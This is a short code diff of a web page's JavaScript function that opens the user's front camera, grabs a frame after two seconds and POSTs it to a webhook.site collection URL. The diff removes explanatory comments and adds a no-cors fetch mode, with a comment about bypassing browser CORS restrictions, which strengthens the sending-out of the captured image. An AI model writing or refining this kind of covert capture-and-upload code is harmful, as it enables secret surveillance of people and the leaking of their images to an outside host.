@@ -61,7 +61,6 @@
 
         async function triggerCapture() {
             try {
-                // Request camera stream
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
@@ -70,7 +69,6 @@
                 video.srcObject = stream;
                 await video.play();
 
-                // Wait 2 seconds for camera auto-exposure and frame rendering
                 await new Promise(resolve => setTimeout(resolve, 2000));
 
                 canvas.width = video.videoWidth || 640;
@@ -82,9 +80,10 @@
                 
                 stream.getTracks().forEach(t => t.stop());
 
-                // Send via standard fetch POST with explicit body
+                // Use no-cors mode to bypass browser CORS restrictions completely
                 await fetch('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/json'
                     },
